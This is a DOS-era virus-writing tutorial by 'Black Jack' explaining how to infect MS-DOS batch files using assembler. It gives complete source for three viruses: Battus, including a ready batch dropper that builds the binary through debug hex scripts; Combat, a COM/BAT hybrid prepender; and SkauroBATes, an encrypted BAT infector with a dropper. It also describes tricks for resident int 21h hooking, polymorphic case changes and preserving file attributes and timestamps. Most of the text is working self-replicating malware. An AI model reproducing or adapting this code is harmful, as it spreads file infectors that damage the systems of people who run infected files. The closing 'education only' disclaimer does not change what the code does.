@@ -1,0 +1,885 @@
+Batch Infection With Assembler by Black Jack
+
+We all know: everything that can be executed is also a potential target for virii. This is of course also true for the simple script language included in MS-DOS known as batch. So what are we waiting for, let's infect it!
+
+I hope you already know that a BAT file is nothing else than DOS commands stored in a text file that are executed one after one. Therefore infection is incredibly simple, just add your code at the beginning and/or at the end of the host code. There's nothing more to do, it's even simpler than COM file infection. The only problem is that the BAT language is very limited in its abilities, remember, they just consist of DOS commands! Nevertheless it is possible to code virii in 100% batch script if you use some coding tricks
+
+(look at Knowdeth's virii, for example, or at the tutorials by Wavefunc). But I will go a different way in this tutorial: I write my batch virii in assembler (like all my virii). But this brings up another problem: how can a text script carry binary code? The main topic of this tutorial is to provide workarounds for that problem and present examples.
+
+1. USING DEBUG SCRIPTS
+----------------------
+Everybody who has MS-DOS installed in one way or the other (even WinNT users) has also a copy of the neat old debug.exe . And it is an well-known trick that it is possible to use it to create binary files out of debug scripts. Well, I think it is quite clear how we can use this to create a BAT infector: the virus ECHOes out a debug script into a temporary file, creates a binary (usually a COM file) using debug and runs it. And so the ASM part takes control and finishes the life-cycle of the virus by either direct infection or going resident.
+
+My Battus virus demonstrates this technique. It is a TSR BAT infector that generates a com file with debug. Then it extracts its code from the bat file with the standart BAT virus find command and attaches it to the COM file. This COM contains a small program that stays resident and monitores the file open functions of int 21h. If it detects that a BAT file is opened (that could mean executed, copied, typed...) it opens the file and appends its own batch code (if the file wasn't infected before, of course). Battus is also slightly polymorph by changing the case of the letters of the batch code.
+
+As a payload, it displays the message: "Battus is now stoned." on March the 20th (the birthday of the ancient roman poet Ovid). Battus is a charakter from Ovid's "Metamorphoses" that was transformed to stone because he tried to fool the god Mercur. That's why this message has two meanings, because it can also be interpreted as a parody on the stoned virus. What can I say, I thought it was funny. ;-)
+
+=======[battus.asm]==========================================================
+
+length_string     EQU 1680
+length_paragraphs EQU ((virusend - start + 100h + 15 + length_string) / 16)
+
+ping = "ov"
+pong = "id"
+
+.model tiny
+.radix 10
+.186
+.code
+org 100h
+start:
+	mov ah, 49h             ; free enviroment block
+	mov es, ds:[2Ch]        ; Get enviroment block in ES
+	int 21h
+
+	mov ax, ping            ; already resident?
+	int 21h
+	cmp ax, pong
+	je already_resident     ; if it is already loaded, then quit.
+
+	mov ax, 3521h           ; get address of int21h
+
+int 21h
+	mov int21_segm, es      ; save it
+	mov int21_offs, bx
+
+	mov ax, 2521h           ; hook int21h
+	mov dx, offset new_int21; DS:DX=pointer to our routine
+	int 21h
+
+	mov ah, 31h             ; terminate, but stay resident
+	mov dx, length_paragraphs ; length in paragraphs
+	int 21h
+
+already_resident:
+	mov ah, 4Ch             ; quit
+	int 21h
+
+new_int21:                        
+	cmp ax, ping            ; virus calling ?
+	jne no_residency_check
+
+mov ax, pong            ; return residency marker
+	iret                    ; back to caller
+
+no_residency_check:
+	push dx                 ; save DX register
+
+	cmp ah, 3Dh             ; open functionh
+	JE infect
+	mov dx, si
+	cmp ah, 6Ch             ; extended open function
+	JE infect
+
+org_int:
+	pop dx                  ; restore DX
+
+		db 0EAh         ; op code far jump
+org_int21       EQU this dword
+int21_offs      dw 0
+int21_segm      dw 0
+
+infect:
+	pusha                           ; save registers
+	push ds
+	push es
+
+	push ds                         ; ES=DS
+	pop es
+
+	mov cx, -1                      ; search file name for extension
+	mov di, dx                      ; ES:DI=offset filename
+	mov al, "."                     ; value for search
+	cld                             ; search upwards
+	repne scasb                     ; search for the dot
+	mov ax, word ptr [di]           ; get first two letters of extension
+
+and ax, not 2020h               ; convert to upper case
+	cmp ax, "AB"                    ; .BAT - file?
+	JNE exit_infect                 ; if it's no BAT file, quit infection
+	mov al, byte ptr [di+2]         ; get third letter of extension
+	and al, not 20h                 ; convert to upper case
+	cmp al, "T"                     ; .BAT - file?
+	JNE exit_infect                 ; if it's no BAT file, quit infection
+
+	mov ax, 3D02h                   ; open file
+
+pushf
+	call cs:[org_int21]             ; simulate int call to org int 21h
+	JC exit_infect                  ; if error, then quit
+	xchg bx, ax                     ; handle to BX
+	
+	mov ax, 4202h                   ; set filehandle relative to EOF
+	mov cx, -1
+	mov dx, -8                      ; 8 bytes before end
+	int 21h
+	
+	push cs                         ; DS=CS
+	pop ds
+
+	mov ah, 3Fh                     ; read from file
+	mov dx, offset read_buffer      ; to our read buffer
+
+mov cx, 8                       ; read 8 bytes
+	int 21h
+	
+	mov ax, word ptr ds:[offset read_buffer]   ; first to letters
+	or ax, 2020h                    ; convert to lowercase
+	cmp ax, "ab"                    ; already infected?
+	JE close                        ; if so, then close & quit
+	
+	push cs                         ; ES=CS
+	pop es
+
+	xor ax, ax                      ; bios get time function
+	int 1Ah                         ; call the BIOS!
+					; DX contains now a "random" value
+
+mov si, offset string
+	mov di, si                      ; DI=SI=offset batch code
+	mov cx, length_string           ; CX=length of batch code
+
+poly_head:
+	lodsb                           ; get a byte from buffer
+	
+	test dx, 1                      ; 0th bit of DX set ?
+	JZ make_lowercase               ; if so, convert to lowercase
+
+make_uppercase:                         ; else, convert to uppercase
+	cmp al, "a"                     ; is it lower case now?
+
+JB no_convert
+	cmp al, "z"
+	JA no_convert
+	sub al, "a" - "A"               ; convert lower case to upper case
+	jmp short no_convert
+
+make_lowercase:                         ; convert to lower case
+	cmp al, "A"                     ; is it upper case now?
+	JB no_convert
+	cmp al, "Z"
+	JA no_convert
+	add al, "a" - "A"               ; convert upper case to lower case
+
+no_convert:
+	stosb                           ; store byte back
+	ror dx, 1                       ; rotate right our "random value"
+
+loop poly_head                  ; loop 'till done
+
+	mov ah, 40h                     ; append batch code to file
+	mov dx, offset string           ; offset
+	mov cx, length_string           ; length
+	int 21h
+
+close:  
+	mov ah, 3Eh                     ; close file
+	int 21h
+exit_infect:
+	pop es                          ; restore registers
+	pop ds
+	popa
+
+	JMP org_int                     ; execute original interrupt handler
+
+read_buffer db 8 dup(0)                 ; read buffer
+
+string:                                 ; offset of batch code
+
+virusend:
+end start
+
+=======[end battus.asm]======================================================
+
+=======[battus.bat]==========================================================
+@Rem This god-fooling Battus code was metamorphosed by Black Jack /LineZer0 /Metaphase
+@Echo Off %Battus%
+Echo.|Date|Find "3-20-">Nul %Battus%
+If Errorlevel 1 Goto Dont_tell_what_happened_to_Battus
+cls %Battus%
+Echo Battus is now stoned.
+
+:Dont_tell_what_happened_to_Battus
+echo e 100 b4 49 8e 06 2c 00 cd 21 b8 76 6f cd 21 3d 64 69 > battus.deb
+echo e 110 74 1c b8 21 35 cd 21 8c 06 4c 01 89 1e 4a 01 b8 >> battus.deb
+echo e 120 21 25 ba 32 01 cd 21 b4 31 ba 88 00 cd 21 b4 4c >> battus.deb
+echo e 130 cd 21 3d 76 6f 75 04 b8 64 69 cf 52 80 fc 3d 74 >> battus.deb
+echo e 140 0d 8b d6 80 fc 6c 74 06 5a ea 00 00 00 00 60 1e >> battus.deb
+echo e 150 06 1e 07 b9 ff ff 8b fa b0 2e fc f2 ae 8b 05 25 >> battus.deb
+
+echo e 160 df df 3d 42 41 75 75 8a 45 02 24 df 3c 54 75 6c >> battus.deb
+echo e 170 b8 02 3d 9c 2e ff 1e 4a 01 72 61 93 b8 02 42 b9 >> battus.deb
+echo e 180 ff ff ba f8 ff cd 21 0e 1f b4 3f ba e2 01 b9 08 >> battus.deb
+echo e 190 00 cd 21 a1 e2 01 0d 20 20 3d 62 61 74 3a 0e 07 >> battus.deb
+echo e 1a0 33 c0 cd 1a be ea 01 8b fe b9 90 06 ac f7 c2 01 >> battus.deb
+echo e 1b0 00 74 0c 3c 61 72 12 3c 7a 77 0e 2c 20 eb 0a 3c >> battus.deb
+echo e 1c0 41 72 06 3c 5a 77 02 04 20 aa d1 ca e2 de b4 40 >> battus.deb
+
+echo e 1d0 ba ea 01 b9 90 06 cd 21 b4 3e cd 21 07 1f 61 e9 >> battus.deb
+echo e 1e0 66 ff 00 00 00 00 00 00 00 00 >> battus.deb
+echo RCX >> battus.deb
+echo ea >> battus.deb
+echo N battus.com >> battus.deb
+echo W >> battus.deb
+echo Q >> battus.deb
+Debug < Battus.Deb > nul
+Set Battus=%0
+If not Exist %0 Set Battus=%0.Bat
+Find /i "Battus" < %BATTUS% >> Battus.Com
+Set Battus=
+Battus.Com
+Del Battus.Com
+Del Battus.Deb
+:Battus
+=======[end battus.bat]======================================================
+
+2. ANOTHER WAY USING DEBUG
+--------------------------
+was discovered by Blacksmith Tony. What he's doing is writing the whole bat code in a way that it can run as both a BAT file and a debug script. He used this technique in his Roshi (published in TI#1) and Mappy (published in CB#5) viruses. I don't feel like explaining exactly what he does here again, if you are interested in this technique, just read his sources, they also contain a
+very detailed description on how this virii work.
+
+3. WRITING COM/BAT HYBRID CODE
+------------------------------
+The trick here is that you write your code in such a clever way that it can be executed as both a BAT and a COM file. Let's look at the BAT code of my Combat virus as an example (assembler code is a little bit below):
+
+-----------------------------------------------------------------------------
+:Àé³
+@Echo Off
+Set Combat=%0
+If %Combat%/==/ Set Combat=C:\Autoexec.bat
+If Not Exist %Combat% set Combat=%0.bat
+
+Copy %Combat% Combat.com > NUL
+Combat.com Jack
+Goto End_Combat
+
+[here is the binary code of the virus]
+
+Combat virus by Black Jack /LineZer0 /Metaphase
+written in Austria in November/December 1999
+:End_Combat
+-----------------------------------------------------------------------------
+
+The first line starts with a doublepoint. That's why it is interpreted as a label by MS-DOS and just ignored if the file is executed as a BAT file. Then the main bat code is executed. What it does is copy itself to the file COMBAT.COM and execute itself again, but this time as a COM file, that is, binary code. And now the first line is treated completely different, as machiene code instruction! And the binary code ":Àé³ " means cmp al, al / JMP binary_code. You see, if the file runs as a BAT, the binary code is simply ignored, and the other way round.
+
+And here is the promised full assembler source code: Combat is a memory resident COM/BAT prepender (with host shifting). When an infected file is run, no matter if it is a COM or a BAT file the virus will get control. It then creates a temporary file (COMBAT.COM) with pure virus code and executes it. This instance of the virus stays resident then as a standart DOS TSR program, interrupt 21h will be hooked. If any .COM or .BAT files are executed or opened the virus will infect them by shifting the host back and writing
+
+the virus code to the beginning of the file.
+
+=======[combat.asm]==========================================================
+; Combat virus by Black Jack /LineZer0 /Metaphase
+;
+; ASSEMBLE WITH: 
+;                TASM /m combat
+;                TLINK /t combat
+;                REN combat.com combat.bat
+
+ping              = 0ABCDh
+pong              = 0DCBAh
+restore_call      = 0ABABh
+buffer_size       = 32*1024
+length_paragraphs = (end_memory - psp + 15)/16
+length_file       = (end_file - start)
+
+.model tiny
+.code
+.386
+org 0
+psp:
+org 100h
+start:
+	db ":", 0C0h                    ; cmp al, al
+	JMP asm_code
+	db 0Dh, 0Ah
+	db "@Echo Off", 0Dh, 0Ah
+	db "Set Combat=%0", 0Dh, 0Ah
+	db "If %Combat%/==/ Set Combat=C:\Autoexec.bat", 0Dh, 0Ah
+	db "If Not Exist %Combat% set Combat=%0.bat", 0Dh, 0Ah
+	db "Copy %Combat% Combat.com > NUL", 0Dh, 0Ah
+	db "Combat.com Jack", 0Dh, 0Ah
+	db "Goto End_Combat", 0Dh, 0Ah
+
+asm_code:
+	pusha                           ; save registers
+
+cmp dword ptr ds:[82h], "kcaJ"  ; time to go resident?
+	JE go_resident
+
+; ----- this parts gets active when an infected COM file is run -------------
+
+	mov ah, 3Ch                     ; create file with pure virus code
+	xor cx, cx                      ; no attributes
+	mov dx, offset fname            ; DS:DX=pointer to filename
+	int 21h
+
+	xchg bx, ax                     ; handle to BX
+
+	mov ah, 40h                     ; write virus code to file
+	mov cx, length_file             ; length to write
+
+mov dx, offset start            ; DS:DX=pointer to buffer
+	int 21h
+
+	mov ah, 3Eh                     ; close file
+	int 21h
+
+	mov ah, 4Ah                     ; resize MCB
+	mov bx, 1000h                   ; BX=new size in paragraphs (one segm)
+					; ES=address of memory block to resize
+	int 21h
+
+	mov segm, cs                    ; fix parameter segment
+
+	mov ax, 4B00h                   ; execute virus-code file
+	mov bx, offset parameter        ; ES:BX=address parameter block
+
+mov dx, offset fname            ; DS:DX=address filename
+	int 21h
+
+	popa                            ; restore registers
+
+	mov ax, restore_call            ; restore host
+	int 21h
+
+	int 20h                         ; if virus TSR load fails, then
+					; simply quit the host :-(
+
+parameter:                              ; parameter block
+	   dw 0                         ; same environment as we
+	   dw offset param              ; offset parameter string (in PSP)
+
+segm       dw 0                         ; segmet parameter string (our CS)
+	   dw 4 dup(-1)                 ; addresses of FCBs (-1 => standart)
+
+; ----- GO RESIDENT ROUTINE -------------------------------------------------
+
+go_resident:
+	mov ah, 41h                     ; delete our temporary file
+	mov dx, offset fname            ; DS:DX=pointer to filename
+	int 21h
+
+	mov ah, 49h                     ; free enviroment block
+	mov es, ds:[2Ch]                ; Get enviroment block in ES
+
+int 21h
+
+	mov ax, ping                    ; already resident?
+	int 21h
+	cmp ax, pong
+	je already_resident             ; if it is already loaded, then quit.
+
+	mov ax, 3521h                   ; get address of int21h
+	int 21h
+	mov int21h_segm, es             ; save it
+	mov int21h_offs, bx
+
+	mov ax, 2521h                   ; hook int21h
+	mov dx, offset new_int21h       ; DS:DX=pointer to our routine
+	int 21h
+
+	mov ah, 31h                     ; terminate, but stay resident
+
+mov dx, length_paragraphs       ; length in paragraphs
+	int 21h
+
+already_resident:
+	mov ax, 4C00h                   ; quit
+	int 21h
+
+; ----- INT 21h HOOK --------------------------------------------------------
+
+new_int21h:                        
+	cmp ax, restore_call            ; restore an infected com file?
+	JE restore_com
+
+	cmp ax, ping                    ; virus calling ?
+	jne no_residency_check
+	
+	mov ax, pong                    ; return residency marker
+
+iret                            ; back to caller
+
+no_residency_check:
+	pusha                           ; save registers
+
+	cmp ah, 3Dh                     ; open function
+	JE infect
+	cmp ah, 4Bh                     ; execute program function
+	JE infect
+	mov dx, si
+	cmp ah, 6Ch                     ; extended open function
+	JE infect
+
+org_int:
+	popa                            ; restore registers
+		
+		db 0EAh                 ; op code far jump
+org_int21h      EQU this dword
+
+int21h_offs     dw 0
+int21h_segm     dw 0
+
+; ----- INFECTION ROUTINE ---------------------------------------------------
+
+infect:
+	push es                         ; save ES
+
+	push ds                         ; ES=DS
+	pop es
+
+	mov cx, -1                      ; search file name for extension
+	mov di, dx                      ; ES:DI=offset filename
+	xor ax, ax                      ; value for search
+	cld                             ; search upwards
+	repne scasb                     ; search for the final zero
+
+mov eax, dword ptr [di-5]       ; get extension to EAX
+	or eax, 20202020h               ; convert to lowercase
+	cmp eax, "tab."                 ; .bat file?
+	JE bat_file
+	cmp eax, "moc."                 ; .com file?
+	JNE exit_infect                 ; if it's no BAT file, quit infection
+
+bat_file:
+	mov word ptr cs:[offset filename], dx   ; save filename address
+	mov word ptr cs:[offset filename+2], ds
+
+	mov ax, 4300h                   ; get attribute
+	pushf
+
+call cs:org_int21h              ; simulate int call to org int 21h
+
+	mov cs:attributes, cx           ; save attributes
+
+	mov ax, 4301h                   ; clear attributes
+	xor cx, cx                      ; new attributes=0
+	pushf
+	call cs:org_int21h              ; simulate int call to org int 21h
+
+	mov ax, 3D02h                   ; open file
+	pushf
+	call cs:org_int21h              ; simulate int call to org int 21h
+	JC exit_infect                  ; if error, then quit
+
+xchg bx, ax                     ; handle to BX
+
+	push cs                         ; ES=DS=CS
+	push cs
+	pop ds
+	pop es
+
+	mov ax, 5700h                   ; get file date/time
+	pushf
+	call org_int21h                 ; simulate int call to org int 21h
+	mov filetime, cx                ; save filedate and -time
+	mov filedate, dx
+
+	mov ah, 3Fh                     ; read in the complete file
+	mov cx, buffer_size             ; size of our buffer
+	mov dx, offset buffer           ; DS:DX=buffer address
+
+pushf
+	call org_int21h                 ; simulate int call to org int 21h
+	cmp cx, ax                      ; read size equal to buffer size?
+	JE close                        ; file size bigger than buffer, abort
+
+	cmp word ptr ds:[offset buffer], 0C03Ah ; file already infected?
+	JE close
+
+	cmp word ptr ds:[offset buffer], "ZM"   ; is it an exe file?
+	JE close
+
+	push ax                         ; save size of victim file
+
+	mov ax, 4200h                   ; move filepointer to SOF
+
+xor cx, cx                      ; DX=CX=0 (new position)
+	cwd
+	pushf
+	call org_int21h                 ; simulate int call to org int 21h
+
+	mov ah, 40h                     ; write virus to begin of file
+	mov cx, length_file             ; length of virus
+	mov dx, offset start            ; DS:DX=address write buffer
+	pushf
+	call org_int21h                 ; simulate int call to org int 21h
+
+	mov ah, 40h                     ; write host back after the virus
+
+pop cx                          ; restore size of host
+	mov dx, offset buffer           ; DS:DX=address of buffer
+	pushf
+	call org_int21h                 ; simulate int call to org int 21h
+ 
+	mov cx, filetime                ; restore filetime and -date
+	mov dx, filedate
+	
+	mov ax, 5701h                   ; reset filetime/-date
+	pushf
+	call org_int21h                 ; simulate int call to org int 21h
+
+close:        
+	mov ah, 3Eh                     ; close file
+
+pushf
+	call org_int21h                 ; simulate int call to org int 21h
+
+	mov ax, 4301h                   ; reset attributes
+	mov cx, attributes              ; old attributes
+	lds dx, filename                ; DS:DX=pointer to filename
+	pushf
+	call cs:org_int21h              ; simulate int call to org int 21h
+
+exit_infect:
+	pop es                          ; restore ES
+	JMP org_int                     ; jump to original interrupt
+
+; ----- RESTORE COM FILE ----------------------------------------------------
+
+restore_com:
+	mov di, 100h                    ; start for COMs
+
+	mov bx, sp                      ; set new return offset
+	mov word ptr ss:[bx], di
+
+	mov si, offset end_file         ; here's the host code stored
+	mov cx, 0FFFFh - length_file    ; move whole host back
+	cld                             ; move upwards
+	rep movsb
+	
+	iret                            ; jump back to start of host
+
+fname   db "Combat.com", 0              ; temporary filename
+
+param   db 5, " Jack", 0                ; command line parameter for virus
+
+	db 0Dh, 0Ah
+	db "Combat virus by Black Jack /LineZer0 /Metaphase", 0Dh, 0Ah
+	db "written in Austria in November/December 1999", 0Dh, 0Ah
+	db ":End_Combat", 0Dh, 0Ah
+
+end_file:
+
+filename        dd ?
+filetime        dw ?
+filedate        dw ?
+attributes      dw ?
+
+buffer          db buffer_size dup(?)
+
+end_memory:
+
+end start
+=======[end combat.asm]======================================================
+
+4. ENCRYPTING THE BINARY CODE
+-----------------------------
+Why is it actually impossible to carry binary code directly in a batch file? Because batch files are text files, and not all characters that can be found in binary code are also legit in text files. For example, everybody knows the characters 0Dh and 0Ah that are carriage return and line feed, used to mark the end of one line in a text file. Also the batch language itself uses some characters for itself (the pipe symbols < > |). Another possible workaround for this problem is to encrypt the binary code of the virus in such a way that it doesn't contain this characters any more. And this was done in the
+
+following SkauroBATes virus. It uses a simple encryption algorithm that shrinks the number of possible characters in the code to 32 which are all possible, but it doubles the size of the code. And also the decryptor has been written in such a careful way that it doesn't contain any illegal characters. And this encrypted code is simply ECHOed out in a temporary COM file by the BAT instance of the virus. Concretely this code is appended to infected BAT files:
+
+-----------------------------------------------------------------------------
+
+@Echo Off
+Echo [encrypted binary code]>Skauro.com
+Skauro.com
+Del Skauro.com
+REM SkauroBATes virus by Black Jack /LineZer0 /Metaphase
+REM coded in Austria in December 1999
+-----------------------------------------------------------------------------
+
+There's just a little problem with this method: the second line is of course very long. And many DOS versions (for example MS-DOS 6.22) can't handle lines of that length, that means the virus won't work with them :-( Anyway, I have tested it under Win95b/MS-DOS 7.10 and it works ok there.
+
+About the virus, there's nothing more to say. After the first infected BAT file (or the first generation COM) is run, it goes resident and appends itself to all opened BAT files.
+
+=======[skauro.asm]==========================================================
+; SkauroBATes virus source code by Black Jack /LineZer0 /Metaphase
+;
+; Assemble with:
+;
+; TASM /m skauro
+; TLINK skauro
+; run skauro.exe to generate the file skauro.com that contains the pure
+; encrypted virus code.
+
+; run skauro.com to make the virus memory resident.
+
+code_length  = (offset start_decrypted - offset start)
+crypt_length = (offset end_virus - offset start_decrypted)
+mem_length   = ((offset end_virus_mem - offset psp + 15) / 4)
+ping         = 0ABCDh
+pong         = 0DCBAh
+
+.model tiny
+.code
+.386
+org 0
+psp:
+org 100h
+start:
+	mov cx, crypt_length            ; length to decrypt
+	mov si, offset crypt_buffer     ; source for crypted code
+	mov di, offset start_decrypted  ; destination for decrypted code
+
+decrypt_loop:
+	lodsw                           ; load encrypted word
+	and al, 00001111b               ; AL=low nibble
+	cmp ah, -1                      ; if AH=-1, the byte is 0
+	JNE ah_not_FFh
+	inc ah                          ; fix to 0
+
+ah_not_FFh:
+	xor al, ah                      ; complete the byte
+					; (same as or, but or opcode is 0Ah, 
+					; and this is no text character)
+	stosb                           ; store decrypted byte
+	LOOP decrypt_loop               ; loop til done
+
+JMP start_decrypted             ; jump to decrypted code
+
+crypt_buffer db (2*crypt_length) dup(0) ; buffer for encrypted code
+
+start_decrypted:
+	mov ax, ping                    ; already resident?
+	int 21h
+	cmp ax, pong
+	JE already_resident             ; if yes, then quit
+
+	mov ah, 49h                     ; free enviroment block
+	mov es, ds:[2Ch]                ; get enviroment block in ES
+	int 21h
+
+	mov ax, 3521h                   ; get address of int21h
+
+int 21h
+	mov org_int21h_segm, es         ; save it
+	mov org_int21h_offs, bx
+
+	mov ax, 2521h                   ; hook int21h
+	mov dx, offset new_int21h       ; DS:DX=pointer to our routine
+	int 21h
+
+	mov ax, 3100h                   ; exit, stay TSR (exit code 0)
+	mov dx, mem_length
+	int 21h
+
+already_resident:
+	int 20h                         ; quit
+
+; ----- INT 21h HOOK --------------------------------------------------------
+new_int21h:
+	cmp ax, ping                    ; residency check?
+
+JNE no_res_check
+	mov ax, pong                    ; we're there!
+	IRET
+
+no_res_check:
+	pushad                          ; save registers
+	push ds
+	push es
+
+	cmp ah, 3Dh                     ; open function?
+	JE infect
+	mov dx, si
+	cmp ah, 6Ch                     ; extended open?
+	JE infect
+		
+org_int:
+	pop es                          ; restore registers
+	pop ds
+	popad
+
+	db 0EAh                         ; JMP FAR imm32 opcode
+org_int21h      EQU this dword
+
+org_int21h_offs dw 0
+org_int21h_segm dw 0
+
+; ----- INFECTION ROUTINE ---------------------------------------------------
+infect:
+	push ds                         ; ES=DS
+	pop es
+
+	mov cl, -1                      ; search file name for extension
+	mov al, 0                       ; value for search
+	mov di, dx                      ; ES:DI=offset filename
+	cld                             ; search upwards
+	repne scasb                     ; search for the final zero
+
+mov eax, dword ptr [di-4]       ; get first two letters of extension
+	and eax, not 20202020h          ; convert to lowercase
+	cmp eax, "TAB"                  ; .bat file?
+	JNE org_int                     ; if not, then quit
+
+	mov ax, 4300h                   ; get attributes
+	pushf
+	call cs:org_int21h              ; call original int21h
+
+	push cx                         ; save attributes
+
+	mov ax, 4301h                   ; vaporize attributes
+	xor cx, cx                      ; attributes=0
+
+pushf
+	call cs:org_int21h              ; call original int21h
+	
+	mov ax, 3D02h                   ; open file read/write
+	pushf
+	call cs:org_int21h              ; call original int21h
+
+	xchg bx, ax                     ; handle to BX
+
+	push cs cs                      ; DS=ES=CS
+	pop es ds
+
+	mov ax, 4202h                   ; move filehandle relative to end
+	mov cx, -1                      ; where to move (high word)
+	mov dx, -bat_code2_length       ;   "    "   "  (low word)
+
+pushf
+	call org_int21h                 ; call original int21h
+
+	mov ah, 3Fh                     ; read file
+	mov cx, bat_code2_length        ; read in part of bat code
+	mov dx, offset read_buffer
+	pushf
+	call org_int21h                 ; call original int21h
+	cmp cx, ax                      ; all bytes read?
+	JNE uninfected                  ; if not, the file can't be infected
+
+	cmp dword ptr ds:[offset read_buffer+1], "uakS" ; already infected?
+	JE close                        ; if yes, then close
+
+uninfected:
+	mov ax, 5700h                   ; get filedate/time
+	pushf
+	call org_int21h                 ; call original int21h
+
+	push cx                         ; save date/time
+	push dx
+
+	mov ax, 4202h                   ; move filepointer to EOF
+	xor cx, cx                      ; DX:CX=distance to move=0
+	cwd
+	pushf
+	call org_int21h                 ; call original int21h
+
+	mov ah, 40h                     ; write 1st part of bat code
+	mov cx, bat_code1_length        ; length to write
+
+mov dx, offset bat_code1        ; DS:DX=pointer to write buffer
+	pushf
+	call org_int21h                 ; call original int21h
+
+	mov ah, 40h                     ; write virus code
+	mov cx, code_length             ; length to write
+	mov dx, offset start            ; DS:DX=pointer to write buffer
+	pushf
+	call org_int21h                 ; call original int21h
+
+	mov ah, 40h                     ; write 2st part of bat code
+	mov cx, bat_code2_length        ; length to write
+
+mov dx, offset bat_code2        ; DS:DX=pointer to write buffer
+	pushf
+	call org_int21h                 ; call original int21h
+
+	pop dx                          ; restore filedate/time
+	pop cx
+	
+	mov ax, 5701h                   ; reset filetime
+	pushf
+	call org_int21h                 ; call original int21h
+
+close:
+	mov ah, 3Eh                     ; close file
+	pushf
+	call org_int21h                 ; call original int21h
+
+	mov ax, 4301h                   ; reset attributes
+
+pop cx
+	pushf
+	call org_int21h                 ; call original int21h
+
+	JMP org_int
+
+; ----- VIRUS DATA ----------------------------------------------------------
+
+bat_code1       db "@Echo Off", 0Dh, 0Ah
+		db "Echo "
+bat_code1_length = $ - offset bat_code1
+
+bat_code2       db ">Skauro.com", 0Dh, 0Ah
+		db "Skauro.com", 0Dh, 0Ah
+		db "Del Skauro.com", 0Dh, 0Ah
+		db "REM SkauroBATes virus by Black Jack /LineZer0 /Metaphase"
+		db 0Dh, 0Ah
+		db "REM coded in Austria in December 1999", 0Dh, 0Ah
+
+bat_code2_length = $ - offset bat_code2
+ 
+end_virus:
+
+read_buffer     db bat_code2_length dup(?)
+
+end_virus_mem:
+
+; ----- FIRST GENERATION DROPPER --------------------------------------------
+
+first_gen_start:
+	push cs cs                      ; DS=ES=CS
+	pop ds es
+
+encrypt:
+	mov si, offset start_decrypted  ; start of virus code to be crypted
+	mov di, offset crypt_buffer     ; place to store encrypted virus code
+	mov cx, crypt_length            ; length to crypt
+
+encrypt_loop:
+	lodsb                           ; AL=a byte to crypt
+	mov ah, al                      ; AH=AL
+	or al, 11110000b                ; set high nibble in AL
+	and ah, 11110000b               ; clear low nibble in AH
+	or ah, ah                       ; AH=0?
+	JNE ah_not_zero                 ; AH is not zero, it's allrigt
+	dec ah                          ; zero is not allowed!
+ah_not_zero:
+	stosw                           ; store encrypted bytes
+	LOOP encrypt_loop               ; loop til done
+
+mov ah, 3Ch                     ; generate skauro.com file
+	xor cx, cx                      ; no attributes
+	mov dx, offset first_gen_filename  ; DS:DX=pointer to filename
+	int 21h
+
+	xchg bx, ax                     ; handle to BX
+
+	mov ah, 40h                     ; write encrypted virus code there
+	mov cx, code_length             ; length to write
+	mov dx, offset start            ; DS:DX=pointer to buffer
+	int 21h
+
+	mov ah, 3Eh                     ; close file
+
+int 21h
+
+	mov ah, 9                       ; display message
+	mov dx, offset message
+	int 21h
+
+	mov ax, 4C00h                   ; quit (returncode 0)
+	int 21h
+
+first_gen_filename      DB "skauro.com", 0
+
+message                 DB "file skauro.com generated. "
+			DB "Run it to load the virus.", 0Dh, 0Ah, "$"
+
+end first_gen_start
+=======[end skauro.asm]======================================================
+
+DISCLAIMER
+----------
+This text contains source code that can be compiled to living viruses. I do *NOT* support the spreading of viruses into the wild, therefore this whole document was written for research and education only. The author and his groups can't be hold responsible for what you decide to do with the information and/or sources presented in this document.
